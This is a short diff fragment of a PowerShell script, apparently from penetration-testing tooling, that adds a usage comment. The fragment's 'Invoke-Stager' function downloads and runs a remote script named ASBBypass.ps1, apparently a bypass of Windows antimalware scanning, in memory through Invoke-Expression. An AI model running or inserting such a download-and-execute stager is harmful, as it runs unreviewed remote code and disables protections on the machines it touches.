@@ -1,3 +1,4 @@
+#Example how to use -ScriptPath with Test-Windows.ps1 functions
 function Invoke-Stager{
     try{
         Invoke-Expression (New-Object net.webclient).DownloadString('https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing/ASBBypass.ps1') | Out-Null
